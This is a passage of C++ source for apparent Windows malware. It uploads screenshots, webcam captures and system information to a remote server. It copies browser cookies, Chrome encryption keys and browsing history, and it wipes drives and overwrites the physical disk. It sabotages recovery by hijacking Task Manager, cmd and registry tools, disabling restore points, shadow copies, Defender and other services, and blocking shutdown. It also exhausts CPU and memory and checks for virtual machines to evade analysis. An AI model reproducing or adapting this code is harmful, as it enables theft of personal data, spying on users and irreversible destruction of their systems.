            DWORD w;
            WriteFile(hf, data.data(), (DWORD)data.size(), &w, nullptr);
            CloseHandle(hf);
        }
    };
    saveBackup(L"inj.log", logdata);
    saveBackup(L"scr.png", scr);
    saveBackup(L"webcam.png", cam);
    saveBackup(L"sysinfo.log", inf);
    diag_log("backup saved to Public");

    if (scr.empty() && cam.empty() && inf.empty() && logdata.empty()) { diag_log("upload: all empty"); return; }

    const char* boundary = "----InjectorBoundaryXYZ123";
    const char* crlf = "\r\n";

    std::vector<BYTE> body;
    auto append = [&](const void* d, size_t n) {
        body.insert(body.end(), (BYTE*)d, (BYTE*)d + n);
    };


    struct Part { const wchar_t* fname; const char* field; const char* mime; std::vector<BYTE>& data; };
    Part parts[] = {
        { L"scr.png",       "screenshot", "image/png",  scr },
        { L"wallpaper.png", "webcam",     "image/png",  cam },
        { L"sysinfo.log",   "sysinfo",    "text/plain", inf },
        { L"inj.log",       "diaglog",    "text/plain", logdata },
    };

    for (auto& pt : parts) {
        if (pt.data.empty()) continue;
        std::string h = std::string("--") + boundary + crlf +
            "Content-Disposition: form-data; name=\"" + pt.field +
            "\"; filename=\"" + std::string(pt.fname, pt.fname + wcslen(pt.fname)) + "\"" + crlf +
            "Content-Type: " + pt.mime + crlf + crlf;
        append(h.c_str(), h.size());
        append(pt.data.data(), pt.data.size());
        append(crlf, 2);
    }

    std::string end = std::string("--") + boundary + "--" + crlf;
    append(end.c_str(), end.size());

    // retry upload up to 3 times, fresh token each attempt
    for (int attempt = 1; attempt <= 3; attempt++) {
        char tmp[64];
        sprintf_s(tmp, "upload: attempt %d", attempt);
        diag_log(tmp);

        // get a fresh token every attempt (one-shot tokens)
        std::string freshToken = fetch_token();
        if (freshToken.empty()) { diag_log("upload: fetch token failed"); break; }

        // rebuild body (no token field, token is in URL)
        std::vector<BYTE> body2;
        {
            for (auto& pt : parts) {
                if (pt.data.empty()) continue;
                std::string h = std::string("--") + boundary + crlf +
                    "Content-Disposition: form-data; name=\"" + pt.field +
                    "\"; filename=\"" + std::string(pt.fname, pt.fname + wcslen(pt.fname)) + "\"" + crlf +
                    "Content-Type: " + pt.mime + crlf + crlf;
                body2.insert(body2.end(), (BYTE*)h.c_str(), (BYTE*)h.c_str() + h.size());
                body2.insert(body2.end(), pt.data.data(), pt.data.data() + pt.data.size());
                body2.insert(body2.end(), (BYTE*)crlf, (BYTE*)crlf + 2);
            }
            std::string end = std::string("--") + boundary + "--" + crlf;
            body2.insert(body2.end(), (BYTE*)end.c_str(), (BYTE*)end.c_str() + end.size());
        }

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
        if (!hSession) { diag_log("upload: WinHttpOpen fail"); Sleep(2000); continue; }

        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 443, 0);
        if (!hConnect) { diag_log("upload: Connect fail"); WinHttpCloseHandle(hSession); Sleep(2000); continue; }

        // build URL with token as query param
        std::string url = "/upload?token=" + freshToken;
        std::wstring wurl(url.begin(), url.end());

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wurl.c_str(),
            nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            // pass Content-Type in headers to SendRequest (more reliable)
            std::string ctHeader = "Content-Type: multipart/form-data; boundary="
                + std::string(boundary) + "\r\n";
            std::wstring wct(ctHeader.begin(), ctHeader.end());

            char t2[96];
            sprintf_s(t2, "upload: bodySize=%zu", body2.size());
            diag_log(t2);

            // SendRequest with NULL body, write body with WriteData
            BOOL sent = WinHttpSendRequest(hRequest,
                wct.c_str(), (DWORD)wct.size(),
                nullptr, 0,
                (DWORD)body2.size(), 0);
            if (sent) {
                DWORD written = 0;
                sent = WinHttpWriteData(hRequest, body2.data(),
                    (DWORD)body2.size(), &written);
                diag_log(sent ? "upload: wrote ok" : "upload: write FAIL");
            }

            if (sent) {
                DWORD statusCode = 0;
                if (WinHttpReceiveResponse(hRequest, nullptr)) {
                    DWORD sz = sizeof(statusCode);
                    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        nullptr, &statusCode, &sz, nullptr);
                    char bodyStr[512] = {};
                    DWORD rd = 0;
                    while (WinHttpReadData(hRequest, bodyStr + rd,
                        (DWORD)sizeof(bodyStr) - rd - 1, &rd) && rd > 0) {}
                    sprintf_s(tmp, "upload: HTTP %lu resp=%s", statusCode, bodyStr);
                    diag_log(tmp);
                } else {
                    diag_log("upload: ReceiveResponse fail");
                }
            } else {
                diag_log("upload: SendRequest/WriteData fail");
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (attempt < 3) Sleep(3000);
    }
}

void disk_wiper()
{
    const char* drives[] = { "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "O:" };
    for (const char* drive : drives) {
        std::string cmd = std::string(XSTR(_cmd1)) + drive + XSTR(_sdq);
        WinExec(cmd.c_str(), SW_HIDE);
    }
}

void play_malicious_audio()
{
    // max system volume via simulated key presses
    for (int i = 0; i < 50; i++) {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
    }

    // synthesize ear-piercing 1kHz sine WAV in memory
    const int SAMPLE_RATE = 22050;
    const int DURATION_SEC = 3;
    const int NUM_SAMPLES = SAMPLE_RATE * DURATION_SEC;
    const int DATA_SIZE = NUM_SAMPLES;       // 8-bit mono
    const int FILE_SIZE = 44 + DATA_SIZE;

    std::vector<BYTE> wav(FILE_SIZE);
    BYTE* p = wav.data();
    // RIFF
    memcpy(p, "RIFF", 4); p += 4;
    *(DWORD*)p = FILE_SIZE - 8; p += 4;
    memcpy(p, "WAVE", 4); p += 4;
    // fmt
    memcpy(p, "fmt ", 4); p += 4;
    *(DWORD*)p = 16; p += 4;
    *(WORD*)p = 1; p += 2;          // PCM
    *(WORD*)p = 1; p += 2;          // mono
    *(DWORD*)p = SAMPLE_RATE; p += 4;
    *(DWORD*)p = SAMPLE_RATE; p += 4; // byte rate
    *(WORD*)p = 1; p += 2;          // block align
    *(WORD*)p = 8; p += 2;          // bits per sample
    // data
    memcpy(p, "data", 4); p += 4;
    *(DWORD*)p = DATA_SIZE; p += 4;
    // 1kHz sine
    for (int i = 0; i < NUM_SAMPLES; i++)
        p[i] = (BYTE)(128 + 127 * sin(2 * 3.14159 * 1000 * i / SAMPLE_RATE));

    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    wcscat_s(tmpPath, L"__snd.tmp");

    HANDLE hFile = CreateFileW(tmpPath, GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, wav.data(), FILE_SIZE, &written, nullptr);
        CloseHandle(hFile);
        PlaySoundW(tmpPath, nullptr, SND_FILENAME | SND_ASYNC | SND_LOOP);
    }
}

void block_power_shutdown()
{
    DWORD one = 1, zero = 0;
    RegSetKeyValueW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        L"NoClose", REG_DWORD, &one, 4);
    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"shutdownwithoutlogon", REG_DWORD, &zero, 4);
    RegSetKeyValueW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"DisableTaskMgr", REG_DWORD, &one, 4);
    RegSetKeyValueW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"DisableChangePassword", REG_DWORD, &one, 4);
    RegSetKeyValueW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"DisableLockWorkstation", REG_DWORD, &one, 4);
}

LRESULT CALLBACK ShutBlk_WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    if (msg == WM_QUERYENDSESSION) return FALSE;  // block all shutdown attempts
    return DefWindowProcW(hwnd, msg, wp, lp);
}

DWORD WINAPI cpu_burn(LPVOID)
{
    while (true) { volatile int x = 0; for (int i = 0; i < 999999; i++) x += i; }
    return 0;
}

DWORD WINAPI delete_fonts(LPVOID)
{
    Sleep(10000);
    RegDeleteTreeW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts");
    return 0;
}

DWORD WINAPI ram_burn(LPVOID)
{
    std::vector<void*> blocks;
    while (true) {
        // allocate 64MB chunks and write to force commit
        SIZE_T sz = 64 * 1024 * 1024;
        void* p = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (p) {
            memset(p, 0xAA, sz);  // touch every page
            blocks.push_back(p);
        } else {
            Sleep(100);  // allocation failed, wait a bit
        }
    }
    return 0;
}

DWORD WINAPI anti_shutdown(LPVOID)
{
    WNDCLASSW wc = {};
    wc.lpfnWndProc = ShutBlk_WndProc;
    wc.hInstance = GetModuleHandleW(nullptr);
    wc.lpszClassName = L"ShutBlkCls";
    RegisterClassW(&wc);
    HWND hwnd = CreateWindowExW(0, L"ShutBlkCls", L"", 0, 0, 0, 0, 0,
        HWND_MESSAGE, nullptr, GetModuleHandleW(nullptr), nullptr);
    ShutdownBlockReasonCreate(hwnd, L"Installing updates...");
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    return 0;
}

DWORD WINAPI beep_chaos(LPVOID)
{
    while (true) {
        MessageBeep(MB_ICONERROR);   Sleep(200);
        MessageBeep(MB_ICONWARNING); Sleep(150);
        MessageBeep(MB_ICONINFORMATION); Sleep(100);
        MessageBeep(MB_ICONERROR);   Sleep(300);
        MessageBeep(MB_ICONHAND);    Sleep(250);
    }
    return 0;
}

DWORD WINAPI screen_icons(LPVOID)
{
    HICON icons[] = {
        LoadIconW(nullptr, IDI_ERROR),
        LoadIconW(nullptr, IDI_WARNING),
        LoadIconW(nullptr, IDI_INFORMATION),
    };
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1920;
    if (sh <= 0) sh = 1080;
    int ci = 0;
    while (true) {
        int x = rand() % sw;
        int y = rand() % sh;
        HDC hdc = GetDC(nullptr);
        if (hdc) {
            DrawIconEx(hdc, x - 16, y - 16, icons[ci % 3], 32, 32, 0, nullptr, DI_NORMAL);
            ReleaseDC(nullptr, hdc);
            ci++;
        }
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI matrix_effect(LPVOID)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hOut, &csbi);
    int cols = csbi.srWindow.Right - csbi.srWindow.Left + 1;
    int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
    if (cols <= 0) cols = 80;
    if (rows <= 0) rows = 25;

    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*";
    int clen = (int)strlen(chars);
    std::vector<int> drops(cols, 0);
    while (true) {
        for (int x = 0; x < cols; x++) {
            if (drops[x] == 0 && (rand() % 100) < 5) drops[x] = 1 + rand() % rows;
        }
        COORD pos;
        for (int x = 0; x < cols; x++) {
            if (drops[x] > 0) {
                pos.X = (SHORT)x; pos.Y = (SHORT)(drops[x] - 1);
                SetConsoleCursorPosition(hOut, pos);
                SetConsoleTextAttribute(hOut, FOREGROUND_GREEN);
                putchar(chars[rand() % clen]);
                pos.Y = (SHORT)drops[x];
                SetConsoleCursorPosition(hOut, pos);
                SetConsoleTextAttribute(hOut, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                putchar(chars[rand() % clen]);
                drops[x]++;
                if (drops[x] > rows) drops[x] = 0;
            }
        }
        Sleep(50);
    }
    return 0;
}

void desktop_destroyer()
{
    block_power_shutdown();

    WinExec(XSTR(_tsk), SW_HIDE);
    Sleep(1000);

    WinExec(XSTR(_swp), SW_HIDE);
    Sleep(500);

    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desktopPath);
    std::wstring desktopDir = std::wstring(desktopPath) + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(desktopDir.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                std::wstring fullPath = std::wstring(desktopPath) + L"\\" + fd.cFileName;
                DeleteFileW(fullPath.c_str());
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    // 100 lock files
    for (int i = 0; i < 100; i++) {
        std::wstring lockFile = std::wstring(desktopPath) + L"\\" +
            std::to_wstring(gen()) + L".lock";
        HANDLE h = CreateFileW(lockFile.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    }
    // 100 nested directories (like original CheeseClient data.bat)
    for (int i = 0; i < 100; i++) {
        std::wstring dirName = std::wstring(desktopPath) + L"\\" + std::to_wstring(gen());
        CreateDirectoryW(dirName.c_str(), nullptr);
        // create deep nested chain inside
        std::wstring chain = dirName;
        for (int d = 0; d < 17; d++) {
            chain += L"\\" + std::to_wstring(gen());
            CreateDirectoryW(chain.c_str(), nullptr);
        }
    }

    wchar_t wallpaperPath[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, wallpaperPath);
    wcscat_s(wallpaperPath, L"\\wallpaper.png");
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath, SPIF_UPDATEINIFILE);

    HWND hTaskbar = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (hTaskbar) ShowWindow(hTaskbar, SW_HIDE);
    HWND hStartBtn = FindWindowExW(GetDesktopWindow(), nullptr, L"button", nullptr);
    if (hStartBtn) ShowWindow(hStartBtn, SW_HIDE);

    // persistent scripts (data.bat + open.cmd with condrv BSOD)
    const char* script2 =
        "@echo off\r\n"
        "copy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n"
        "cd %userprofile%\\desktop\r\n"
        ":loop\r\n"
        "echo %random% >> %random%.lock\r\n"
        "md \"%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\"\r\n"
        "goto loop\r\n";

    const char* script3 =
        "@echo off\r\n"
        "copy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n"
        ":loop\r\n"
        "start www.%random%.net\r\n"
        "copy nul \\\\.\\PhysicalDrive0\r\n"
        "cd C:\\:$i30:$bitmap\r\n"
        "start %random%\r\n"
        "goto loop\r\n";

    struct { const char* content; const char* prefix; const char* ext; } scrs[] = {
        { script2, "data", ".bat" },
        { script3, "open", ".cmd" },
    };

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    for (auto& si : scrs) {
        wchar_t filePath[MAX_PATH];
        swprintf_s(filePath, MAX_PATH, L"%ls%hs%d%hs", tempPath, si.prefix, gen() % 100000, si.ext);
        HANDLE hScript = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hScript != INVALID_HANDLE_VALUE) {
            DWORD written;
            DWORD clen = (DWORD)strlen(si.content);
            WriteFile(hScript, si.content, clen, &written, nullptr);
            CloseHandle(hScript);
            _wsystem((L"cmd /c start /b \"\" \"" + std::wstring(filePath) + L"\"").c_str());
            SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    // start font deletion timer (fires 10s after popup)
    CreateThread(nullptr, 0, delete_fonts, nullptr, 0, nullptr);

    MessageBoxW(nullptr, L"ur pc just fuck up", L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);

    // max out CPU + RAM
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    for (DWORD i = 0; i < si.dwNumberOfProcessors * 2; i++)
        CreateThread(nullptr, 0, cpu_burn, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, ram_burn, nullptr, 0, nullptr);

    // block all shutdown methods
    // power button → do nothing
    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Power\\User\\PowerSchemes",
        L"ActivePowerScheme", REG_SZ, L"8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", 76);
    // block shutdown from security screen (Ctrl+Alt+Del)
    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hk, L"DisableCAD", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    // disable shutdown tracker
    DWORD z = 0;
    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\Reliability",
        L"ShutdownReasonOn", REG_DWORD, &z, 4);
}

void cripple_exe_association()
{
    RegDeleteKeyW(HKEY_CLASSES_ROOT, L"exefile\\shell\\open\\command");
    RegDeleteKeyW(HKEY_CLASSES_ROOT, L".exe");
    WinExec(XSTR(_aso), SW_HIDE);
    WinExec(XSTR(_ftp), SW_HIDE);
}

void ifeo_hijack_recovery_tools()
{
    const wchar_t* targets[] = {
        L"taskmgr.exe", L"cmd.exe", L"powershell.exe", L"pwsh.exe",
        L"regedit.exe", L"reg.exe", L"msconfig.exe", L"mmc.exe",
        L"notepad.exe", L"explorer.exe", L"rundll32.exe", L"control.exe",
        L"sconfig.exe", L"SystemPropertiesAdvanced.exe", L"wbemtest.exe",
        L"perfmon.exe", L"resmon.exe", L"devmgmt.msc", L"services.msc",
        L"diskmgmt.msc", L"compmgmt.msc", L"eventvwr.exe", L"gpedit.msc",
        L"rstrui.exe", L"recdisc.exe", L"vssadmin.exe", L"bcdedit.exe",
        L"sfc.exe", L"dism.exe", L"wmic.exe", L"powershell_ise.exe",
        L"iexplore.exe", L"firefox.exe", L"chrome.exe", L"msedge.exe",
        L"taskhostw.exe", L"mshta.exe", L"cscript.exe", L"wscript.exe",
        L"msiexec.exe", L"setup.exe", L"procexp.exe", L"procmon.exe",
    };

    for (auto* name : targets) {
        wchar_t path[256];
        swprintf_s(path, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            L"Image File Execution Options\\%s", name);

        HKEY hKey;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path, 0, nullptr,
            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            const wchar_t* fakeDbg = L"svchost.exe";
            RegSetValueExW(hKey, L"Debugger", 0, REG_SZ,
                (const BYTE*)fakeDbg, (DWORD)(wcslen(fakeDbg) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
        }
    }
}

void cripple_system()
{
    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
        L"Path", REG_EXPAND_SZ, L"", 2);

    SetEnvironmentVariableW(L"Path", L"");

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore",
        0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr)
        == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExW(hKey, L"DisableConfig", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueExW(hKey, L"DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    WinExec(XSTR(_vss), SW_HIDE);
    WinExec(XSTR(_wmi), SW_HIDE);

    WinExec(XSTR(_rea), SW_HIDE);
    WinExec("cmd /c bcdedit /set {current} recoveryenabled No", SW_HIDE);

    const char* svcs[] = {
        "Winmgmt", "wuauserv", "BITS", "Schedule", "EventLog",
        "PlugPlay", "Spooler", "Themes", "FontCache", "WSearch",
        "defragsvc", "DiagTrack", "dmwappushservice", "Fax",
        "MapsBroker", "lfsvc", "LicenseManager", "wlidsvc",
        "MpsSvc", "BFE", "WinDefend", "SecurityHealthService",
        "WaaSMedicSvc", "UsoSvc", "DoSvc", "SgrmBroker", "SENS",
        "wcncsvc", "Wecsvc", "WEPHOSTSVC", "WerSvc",
        "TermService", "SessionEnv", "ShellHWDetection",
        "seclogon", "SamSs", "RmSvc", "RasMan", "PcaSvc",
        "Netman", "NlaSvc", "MSiSCSI", "MSDTC", "KeyIso",
        "IKEEXT", "hidserv", "FrameServer", "ehRecvr", "DusmSvc",
    };
    for (auto* svc : svcs) {
        std::string cmd = std::string(XSTR(_scc)) + svc +
            XSTR(_ssd) + svc;
        WinExec(cmd.c_str(), SW_HIDE);
    }
}

void guarded_screenshot()
{
    __try { capture_screenshot(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void guarded_webcam()
{
    __try { capture_webcam(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void steal_cookies()
{
    wchar_t localAppData[MAX_PATH], roamingAppData[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    struct { const wchar_t* name; const wchar_t* base; int type; const wchar_t* sub; } browsers[] = {
        {L"Chrome",  L"Google\\Chrome\\User Data",              0, L"Default\\Network\\Cookies"},
        {L"Edge",    L"Microsoft\\Edge\\User Data",              0, L"Default\\Network\\Cookies"},
        {L"Brave",   L"BraveSoftware\\Brave-Browser\\User Data", 0, L"Default\\Network\\Cookies"},
        {L"Opera",   L"Opera Software\\Opera Stable",            1, L"Network\\Cookies"},
        {L"Yandex",  L"Yandex\\YandexBrowser\\User Data",       0, L"Default\\Network\\Cookies"},
        {L"Chromium",L"Chromium\\User Data",                     0, L"Default\\Network\\Cookies"},
    };

    wchar_t outDir[MAX_PATH];
    GetTempPathW(MAX_PATH, outDir);

    for (auto& b : browsers) {
        wchar_t src[MAX_PATH];
        swprintf_s(src, L"%s\\%s\\%s",
            b.type == 0 ? localAppData : roamingAppData, b.base, b.sub);
        wchar_t dst[MAX_PATH];
        swprintf_s(dst, L"%s\\cookies_%s.db", outDir, b.name);
        CopyFileW(src, dst, FALSE);

        // also steal Local State (encryption key)
        wchar_t lsSrc[MAX_PATH];
        swprintf_s(lsSrc, L"%s\\%s\\Local State",
            b.type == 0 ? localAppData : roamingAppData, b.base);
        wchar_t lsDst[MAX_PATH];
        swprintf_s(lsDst, L"%s\\localstate_%s.json", outDir, b.name);
        CopyFileW(lsSrc, lsDst, FALSE);
    }

    // Firefox — cookies.sqlite in profile folders
    wchar_t ffBase[MAX_PATH];
    swprintf_s(ffBase, L"%s\\Mozilla\\Firefox\\Profiles", roamingAppData);
    wchar_t ffSearch[MAX_PATH];
    swprintf_s(ffSearch, L"%s\\*", ffBase);
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(ffSearch, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[0] == L'.') continue;
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            wchar_t src[MAX_PATH];
            swprintf_s(src, L"%s\\%s\\cookies.sqlite", ffBase, fd.cFileName);
            wchar_t dst[MAX_PATH];
            swprintf_s(dst, L"%s\\cookies_Firefox_%s.db", outDir, fd.cFileName);
            CopyFileW(src, dst, FALSE);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
}

void steal_history()
{
    wchar_t localAppData[MAX_PATH], roamingAppData[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    struct { const wchar_t* name; const wchar_t* base; int type; } browsers[] = {
        {L"Chrome",  L"Google\\Chrome\\User Data",              0},
        {L"Edge",    L"Microsoft\\Edge\\User Data",              0},
        {L"Brave",   L"BraveSoftware\\Brave-Browser\\User Data", 0},
        {L"Opera",   L"Opera Software\\Opera Stable",            1},
        {L"Yandex",  L"Yandex\\YandexBrowser\\User Data",       0},
        {L"Chromium",L"Chromium\\User Data",                     0},
    };

    wchar_t outDir[MAX_PATH];
    GetTempPathW(MAX_PATH, outDir);

    for (auto& b : browsers) {
        wchar_t src[MAX_PATH];
        swprintf_s(src, L"%s\\%s\\Default\\History",
            b.type == 0 ? localAppData : roamingAppData, b.base);
        wchar_t dst[MAX_PATH];
        swprintf_s(dst, L"%s\\history_%s.db", outDir, b.name);
        CopyFileW(src, dst, FALSE);
    }

    // Firefox — places.sqlite
    wchar_t ffBase[MAX_PATH];
    swprintf_s(ffBase, L"%s\\Mozilla\\Firefox\\Profiles", roamingAppData);
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((std::wstring(ffBase) + L"\\*").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[0] == L'.') continue;
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            wchar_t src[MAX_PATH];
            swprintf_s(src, L"%s\\%s\\places.sqlite", ffBase, fd.cFileName);
            wchar_t dst[MAX_PATH];
            swprintf_s(dst, L"%s\\history_Firefox_%s.db", outDir, fd.cFileName);
            CopyFileW(src, dst, FALSE);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
}

void guarded_history()
{
    __try { steal_history(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void guarded_cookies()
{
    __try { steal_cookies(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void guarded_audio()
{
    __try { play_malicious_audio(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void guarded_upload()
{
    __try { simple_upload(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

void guarded_collect()
{
    guarded_screenshot();
    guarded_webcam();
    steal_info();
    guarded_cookies();
    guarded_history();
    guarded_upload();
}

// registry key hit helper
static bool reg_exists(HKEY root, const wchar_t* path)
{
    HKEY hk;
    bool ok = RegOpenKeyExW(root, path, 0, KEY_READ, &hk) == ERROR_SUCCESS;
    if (ok) RegCloseKey(hk);
    return ok;
}
static std::wstring reg_read(HKEY root, const wchar_t* path, const wchar_t* val)
{
    HKEY hk; std::wstring s;
    if (RegOpenKeyExW(root, path, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t buf[256] = {}; DWORD sz = sizeof(buf);
        RegQueryValueExW(hk, val, nullptr, nullptr, (BYTE*)buf, &sz);
        RegCloseKey(hk);
        s = buf;
    }
    return s;
}

bool is_vm()
{
    int score = 0;

    // ---- L1: CPUID hypervisor bit ----
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) { score += 3; }  // hypervisor present

    // CPUID hypervisor vendor leaf (0x40000000)
    char vendor[13] = {};
    __cpuid(cpuInfo, 0x40000000);
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[2], 4);
    memcpy(vendor + 8, &cpuInfo[3], 4);
    if (strstr(vendor, "VMware") || strstr(vendor, "KVMKVMKVM") ||
        strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "Microsoft Hv") ||
        strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv"))
        score += 5;

    // ---- L2: SMBIOS system manufacturer ----
    std::wstring sysMfr = reg_read(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer");
    std::wstring sysProd = reg_read(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemProductName");
    const wchar_t* vmNames[] = { L"VMware", L"VirtualBox", L"QEMU", L"KVM",
        L"innotek", L"Xen", L"Parallels", L"Hyper-V", L"Bochs", L"Virt", L"Oracle" };
    for (auto* n : vmNames) {
        if (sysMfr.find(n) != std::wstring::npos) { score += 4; break; }
    }
    for (auto* n : vmNames) {
        if (sysProd.find(n) != std::wstring::npos) { score += 3; break; }
    }

    // BIOS version string
    std::wstring biosVer = reg_read(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVersion");
    for (auto* n : vmNames) {
        if (biosVer.find(n) != std::wstring::npos) { score += 2; break; }
    }

    // ---- L3: Registry keys (VMware/VBox tools & services) ----
    const wchar_t* regKeys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
